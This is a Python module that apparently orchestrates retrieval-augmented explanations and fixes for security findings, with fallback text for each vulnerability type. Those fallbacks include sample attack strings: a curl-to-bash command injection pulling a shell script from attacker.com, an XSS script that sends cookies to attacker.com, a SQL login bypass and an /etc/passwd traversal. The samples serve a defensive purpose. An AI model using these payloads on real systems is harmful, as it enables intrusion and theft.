"""
RAG orchestrator — the single entry point for /rag/explain and /rag/fix.

Fix history:
- Raised timeout (was 15s, now 120s via config)
- Added source_mode to all responses ("rag" | "fallback")
- Replaced bare ExplainResponse(**parsed) with safe field-by-field normalization
- Added type-specific fallback content (not generic "AI explanation unavailable")
- Added structured logging for every failure point
- Prompt now uses build_explain_prompt / build_fix_prompt (stricter JSON-only rules)
"""

from __future__ import annotations

import logging
from typing import Any, Dict, List, Optional

from sqlalchemy.orm import Session

from app.agents.base_agent import BaseAgent
from app.config import get_settings

from .prompt_builder import build_explain_prompt, build_fix_prompt
from .retriever_service import search_chunks
from .schemas import ExplainRequest, ExplainResponse, FixResponse, Reference

logger = logging.getLogger(__name__)
settings = get_settings()

_agent = BaseAgent(name="RAG Agent")


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _parse_references(raw: Any) -> List[Reference]:
    """Safely parse a references list from model output."""
    refs: List[Reference] = []
    if not isinstance(raw, list):
        return refs
    for item in raw:
        if isinstance(item, dict):
            label = str(item.get("label") or "").strip()
            source = str(item.get("source") or "").strip()
            if label and source:
                refs.append(Reference(label=label, source=source))
    return refs


def _str(value: Any, fallback: str = "") -> str:
    """Coerce a value to a non-empty string or return fallback."""
    if value is None:
        return fallback
    s = str(value).strip()
    return s if s else fallback


def _chunks_to_refs(chunks: List[Dict[str, Any]]) -> List[Reference]:
    """Build Reference objects from retrieved KB chunks."""
    refs: List[Reference] = []
    seen = set()
    for c in chunks:
        label = c.get("title") or c.get("source") or ""
        source = c.get("source") or ""
        key = (label, source)
        if label and source and key not in seen:
            seen.add(key)
            refs.append(Reference(label=label, source=source))
    return refs


# ---------------------------------------------------------------------------
# Type-specific fallback content
# ---------------------------------------------------------------------------

def _fallback_content(vuln_type: str) -> Dict[str, Any]:
    """Return polished deterministic content keyed by vulnerability type."""
    vt = (vuln_type or "").lower()

    if "sql" in vt:
        return {
            "title": "SQL Injection",
            "summary": "SQL injection allows attackers to manipulate database queries by injecting untrusted input.",
            "technical_explanation": (
                "User-controlled data is concatenated directly into a SQL statement without parameterization, "
                "allowing an attacker to alter query logic, bypass authentication, or exfiltrate data."
            ),
            "impact": "Unauthorized data access, modification, deletion, or full database takeover.",
            "exploit_scenario": "Attacker supplies ' OR '1'='1 to bypass a login check and dump all user records.",
            "fix_recommendation": "Use parameterized queries or prepared statements. Never concatenate user input into SQL.",
            "secure_example": "cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))",
            "references": [
                Reference(label="CWE-89", source="CWE"),
                Reference(label="OWASP A03:2021 Injection", source="OWASP"),
            ],
        }
    if "command" in vt:
        return {
            "title": "Command Injection",
            "summary": "Command injection allows execution of arbitrary OS commands via unsanitized user input.",
            "technical_explanation": (
                "Untrusted input is interpolated into a shell command string. "
                "Using shell=True or os.system() with user data enables attackers to append arbitrary commands."
            ),
            "impact": "Remote code execution, data exfiltration, privilege escalation, or lateral movement.",
            "exploit_scenario": "User supplies ; curl attacker.com/shell.sh | bash to execute a remote payload.",
            "fix_recommendation": "Use subprocess.run() with a list of arguments and shell=False. Apply strict input allowlists.",
            "secure_example": "subprocess.run(['ls', safe_path], check=True, shell=False)",
            "references": [
                Reference(label="CWE-78", source="CWE"),
                Reference(label="OWASP Command Injection Cheat Sheet", source="OWASP"),
            ],
        }
    if "xss" in vt or "cross-site" in vt:
        return {
            "title": "Cross-Site Scripting (XSS)",
            "summary": "XSS lets attackers inject scripts into pages viewed by other users.",
            "technical_explanation": (
                "Unescaped user input is reflected or stored and rendered in HTML/JS context, "
                "allowing script execution in victims' browsers."
            ),
            "impact": "Session hijacking, credential theft, defacement, or malware distribution.",
            "exploit_scenario": "<script>document.location='https://attacker.com/?c='+document.cookie</script> is stored and served to victims.",
            "fix_recommendation": "Use context-aware output encoding, framework auto-escaping, and a strict Content Security Policy.",
            "secure_example": "Use {{ value | e }} in Jinja2 or React's JSX (which escapes by default).",
            "references": [
                Reference(label="CWE-79", source="CWE"),
                Reference(label="OWASP A03:2021 Injection", source="OWASP"),
            ],
        }
    if "secret" in vt or "credential" in vt or "hardcoded" in vt:
        return {
            "title": "Hardcoded Secrets",
            "summary": "Hardcoded credentials expose sensitive keys or passwords in source code.",
            "technical_explanation": (
                "Secrets stored in source files are visible to anyone with repository access "
                "and can leak through version control history, logs, or error messages."
            ),
            "impact": "Unauthorized access to services, data breaches, or account takeover.",
            "exploit_scenario": "A leaked API key in a public repo is scraped and used to access cloud resources.",
            "fix_recommendation": "Move secrets to environment variables or a secrets manager. Rotate any exposed credentials immediately.",
            "secure_example": "api_key = os.environ['SERVICE_API_KEY']",
            "references": [
                Reference(label="CWE-798", source="CWE"),
                Reference(label="OWASP Secrets Management", source="OWASP"),
            ],
        }
    if "path" in vt or "traversal" in vt:
        return {
            "title": "Path Traversal",
            "summary": "Path traversal lets attackers access files outside the intended directory.",
            "technical_explanation": (
                "User input containing ../ sequences is used in file path construction without normalization, "
                "allowing access to arbitrary files on the server."
            ),
            "impact": "Disclosure of configuration files, private keys, or source code.",
            "exploit_scenario": "Supplying ../../etc/passwd as a filename parameter reads the system password file.",
            "fix_recommendation": "Normalize and resolve paths, enforce an allowlist of permitted directories, reject inputs with traversal sequences.",
            "secure_example": (
                "safe_base = Path('/app/data').resolve()\n"
                "target = (safe_base / user_input).resolve()\n"
                "assert target.is_relative_to(safe_base)"
            ),
            "references": [
                Reference(label="CWE-22", source="CWE"),
                Reference(label="OWASP Path Traversal", source="OWASP"),
            ],
        }
    # Generic fallback
    return {
        "title": f"Security Finding: {vuln_type}",
        "summary": "A potential security weakness was detected in the application.",
        "technical_explanation": "Untrusted input or an insecure pattern may allow an attacker to abuse this code path.",
        "impact": "Risk ranges from data exposure to code execution depending on context.",
        "exploit_scenario": "An attacker crafts input that exploits the insecure pattern to gain an advantage.",
        "fix_recommendation": "Apply input validation, least privilege, and use framework-provided secure APIs.",
        "secure_example": "Consult OWASP guidelines for the specific vulnerability type.",
        "references": [],
    }


# ---------------------------------------------------------------------------
# Normalize model output → ExplainResponse
# ---------------------------------------------------------------------------

def _normalize_explain(
    parsed: Dict[str, Any],
    req: ExplainRequest,
    chunks: List[Dict[str, Any]],
    fallback: Dict[str, Any],
) -> ExplainResponse:
    """
    Safely map model output to ExplainResponse.
    Falls back field-by-field so a partial response is still useful.
    """
    ctx_count = len(chunks)
    refs = _parse_references(parsed.get("references"))
    if not refs:
        refs = _chunks_to_refs(chunks) or fallback.get("references", [])

    return ExplainResponse(
        finding_id=req.finding_id,
        title=_str(parsed.get("title"), fallback["title"]),
        summary=_str(parsed.get("summary"), fallback["summary"]),
        technical_explanation=_str(parsed.get("technical_explanation"), fallback["technical_explanation"]),
        impact=_str(parsed.get("impact"), fallback["impact"]),
        exploit_scenario=_str(parsed.get("exploit_scenario"), fallback["exploit_scenario"]),
        fix_recommendation=_str(parsed.get("fix_recommendation"), fallback["fix_recommendation"]),
        secure_example=_str(parsed.get("secure_example"), fallback.get("secure_example", "")),
        references=refs,
        retrieved_context_count=ctx_count,
        source_mode="rag",
    )


def _normalize_fix(
    parsed: Dict[str, Any],
    req: ExplainRequest,
    chunks: List[Dict[str, Any]],
) -> FixResponse:
    ctx_count = len(chunks)
    refs = _parse_references(parsed.get("references"))
    if not refs:
        refs = _chunks_to_refs(chunks)

    notes_raw = parsed.get("notes")
    notes: List[str] = []
    if isinstance(notes_raw, list):
        notes = [str(n).strip() for n in notes_raw if n]

    return FixResponse(
        finding_id=req.finding_id,
        title=_str(parsed.get("title"), f"Fix for {req.type}"),
        fix_summary=_str(parsed.get("fix_summary"), "Apply secure coding patterns to eliminate this vulnerability."),
        why_this_fix_is_safer=_str(
            parsed.get("why_this_fix_is_safer"),
            "It separates data from execution and enforces validation or escaping.",
        ),
        fixed_code=_str(parsed.get("fixed_code"), ""),
        notes=notes or ["Review related CWE/OWASP guidance.", "Add regression tests around the fix."],
        references=refs,
        retrieved_context_count=ctx_count,
        source_mode="rag",
    )


# ---------------------------------------------------------------------------
# Fallback builders
# ---------------------------------------------------------------------------

def _fallback_explain(req: ExplainRequest, chunks: List[Dict[str, Any]], reason: str) -> ExplainResponse:
    logger.warning("[RAG explain] Falling back to deterministic response. Reason: %s", reason)
    fb = _fallback_content(req.type)
    refs = fb.get("references") or _chunks_to_refs(chunks)
    return ExplainResponse(
        finding_id=req.finding_id,
        title=fb["title"],
        summary=fb["summary"],
        technical_explanation=fb["technical_explanation"],
        impact=fb["impact"],
        exploit_scenario=fb["exploit_scenario"],
        fix_recommendation=fb["fix_recommendation"],
        secure_example=fb.get("secure_example", ""),
        references=refs,
        retrieved_context_count=len(chunks),
        source_mode="fallback",
    )


def _fallback_fix(req: ExplainRequest, chunks: List[Dict[str, Any]], reason: str) -> FixResponse:
    logger.warning("[RAG fix] Falling back to deterministic response. Reason: %s", reason)
    fb = _fallback_content(req.type)
    return FixResponse(
        finding_id=req.finding_id,
        title=f"Fix for {fb['title']}",
        fix_summary=fb["fix_recommendation"],
        why_this_fix_is_safer="This approach eliminates the root cause by removing direct use of untrusted input in sensitive operations.",
        fixed_code="",
        notes=["Review related CWE/OWASP guidance.", "Add regression tests around the fix."],
        references=fb.get("references") or _chunks_to_refs(chunks),
        retrieved_context_count=len(chunks),
        source_mode="fallback",
    )


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def run_explain(db: Session, req: ExplainRequest) -> ExplainResponse:
    fallback = _fallback_content(req.type)

    # 1. Retrieve context
    chunks = search_chunks(
        db,
        query=req.description or req.type,
        vulnerability_type=req.type,
        language=req.language,
        framework=req.framework,
        top_k=settings.rag_top_k,
    )
    logger.info("[RAG explain] Retrieved %d chunks for finding_id=%s type=%r", len(chunks), req.finding_id, req.type)

    # 2. Build prompt using KB chunks converted to KBEntry-like dicts
    from .schemas import KBEntry, Reference as Ref  # local import to avoid circular
    kb_contexts = _chunks_to_kb_entries(chunks)
    prompt = build_explain_prompt(req, kb_contexts)

    # 3. Call Ollama
    raw = _agent.send_prompt(prompt)
    if not raw:
        return _fallback_explain(req, chunks, "Ollama returned empty response (timeout or connection error)")

    # 4. Parse JSON
    parsed = _agent.safe_json_loads(raw)
    if not isinstance(parsed, dict):
        logger.warning(
            "[RAG explain] JSON parse failed for finding_id=%s. Raw preview: %r",
            req.finding_id, raw[:200],
        )
        return _fallback_explain(req, chunks, f"JSON parse failed (raw len={len(raw)})")

    # 5. Normalize and return
    try:
        return _normalize_explain(parsed, req, chunks, fallback)
    except Exception as exc:
        logger.error("[RAG explain] Normalization error for finding_id=%s: %s", req.finding_id, exc)
        return _fallback_explain(req, chunks, f"Normalization error: {exc}")


def run_fix(db: Session, req: ExplainRequest) -> FixResponse:
    # 1. Retrieve context
    chunks = search_chunks(
        db,
        query=req.description or req.type,
        vulnerability_type=req.type,
        language=req.language,
        framework=req.framework,
        top_k=settings.rag_top_k,
    )
    logger.info("[RAG fix] Retrieved %d chunks for finding_id=%s type=%r", len(chunks), req.finding_id, req.type)

    # 2. Build prompt
    kb_contexts = _chunks_to_kb_entries(chunks)
    prompt = build_fix_prompt(req, kb_contexts)

    # 3. Call Ollama
    raw = _agent.send_prompt(prompt)
    if not raw:
        return _fallback_fix(req, chunks, "Ollama returned empty response (timeout or connection error)")

    # 4. Parse JSON
    parsed = _agent.safe_json_loads(raw)
    if not isinstance(parsed, dict):
        logger.warning(
            "[RAG fix] JSON parse failed for finding_id=%s. Raw preview: %r",
            req.finding_id, raw[:200],
        )
        return _fallback_fix(req, chunks, f"JSON parse failed (raw len={len(raw)})")

    # 5. Normalize and return
    try:
        return _normalize_fix(parsed, req, chunks)
    except Exception as exc:
        logger.error("[RAG fix] Normalization error for finding_id=%s: %s", req.finding_id, exc)
        return _fallback_fix(req, chunks, f"Normalization error: {exc}")


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

def _chunks_to_kb_entries(chunks: List[Dict[str, Any]]):
    """Convert retriever dicts to KBEntry objects for the prompt builder."""
    from .schemas import KBEntry, Reference as Ref
    entries = []
    for c in chunks:
        meta = c.get("metadata") or {}
        entries.append(
            KBEntry(
                id=c.get("chunk_id", ""),
                title=c.get("title", ""),
                source=c.get("source", ""),
                vulnerability_type=meta.get("vulnerability_type", ""),
                language=meta.get("language"),
                framework=meta.get("framework"),
                tags=meta.get("tags", []),
                content=c.get("content", ""),
                references=[],
            )
        )
    return entries
